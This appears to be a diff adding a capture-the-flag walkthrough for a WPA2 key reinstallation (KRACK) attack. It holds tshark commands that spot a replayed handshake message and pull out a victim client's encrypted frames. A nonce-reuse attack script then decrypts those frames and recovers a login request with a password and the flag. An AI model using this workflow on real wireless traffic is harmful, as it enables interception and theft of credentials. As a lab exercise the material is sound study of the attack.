@@ -1,0 +1,41 @@
+\\Key Reinstallation identification:
+❯ tshark -r capture-7.pcap -Y "eapol" \
+        -T fields -e frame.number -e frame.time_relative -e wlan.ta -e wlan.ra \
+        -e wlan.fc.retry -e wlan_rsna_eapol.keydes.msgnr -e eapol.keydes.replay_counter \
+        -e wlan_rsna_eapol.keydes.key_info.install
+50      4.398428000     00:1a:1e:66:b9:77       f0:18:98:b3:ea:c5       False   1       1       False
+51      4.402428000     f0:18:98:b3:ea:c5       00:1a:1e:66:b9:77       False   2       1       False
+53      4.406429000     00:1a:1e:66:b9:77       f0:18:98:b3:ea:c5       False   3       2       True
+54      4.410429000     f0:18:98:b3:ea:c5       00:1a:1e:66:b9:77       False   4       2       False
+152     12.544756000    00:1a:1e:66:b9:77       3c:22:fb:c1:0e:c3       False   1       1       False
+153     12.548756000    3c:22:fb:c1:0e:c3       00:1a:1e:66:b9:77       False   2       1       False
+154     12.552756000    00:1a:1e:66:b9:77       3c:22:fb:c1:0e:c3       False   3       2       True
+155     12.556757000    3c:22:fb:c1:0e:c3       00:1a:1e:66:b9:77       False   4       2       False
+294     25.304423000    00:1a:1e:66:b9:77       f0:18:98:b3:ea:c5       False   3       3       True
+295     25.308423000    f0:18:98:b3:ea:c5       00:1a:1e:66:b9:77       False   4       3       False
+
+\\ f0:18:98:b3:ea:c5 is the victim client
+  
+\\To count the bytes of expense-form.txt
+❯ wc -c expense-form.txt
+1367 expense-form.txt
+
+\\To extract every victim client's encrypted frame in a tsv file.
+❯ tshark -r capture-7.pcap -Y "wlan.ta==f0:18:98:b3:ea:c5 && wlan.fc.protected==1 && !eapol" \
+        -T fields -e frame.number -e wlan.ccmp.extiv -e frame.len -e data.data \
+        > frames_client.tsv
+
+\\To run the python script.
+❯ python3 nonce_reuse_attack.py frames_client.tsv expense-form.txt
+PN ripetuti trovati: ['0x000000000001', '0x000000000002', '0x000000000003', '0x000000000004', '0x000000000005', '0x000000000006', '0x000000000007', '0x000000000008', '0x000000000009', '0x00000000000A', '0x00000000000B', '0x00000000000C', '0x00000000000D']
+Trovata coppia utile: PN=0x00000000000C, frame ['190', '385']
+
+--- Recuperato da frame 385 (PN=0x00000000000C) ---
+POST /login HTTP/1.1
+Host: intranet.acme.test
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 64
+
+user=l.ferrari&password=netsec{70eca2ca80d5ef3d005ee0412f0bb273}!Jv:
+
+FLAG: netsec{70eca2ca80d5ef3d005ee0412f0bb273}
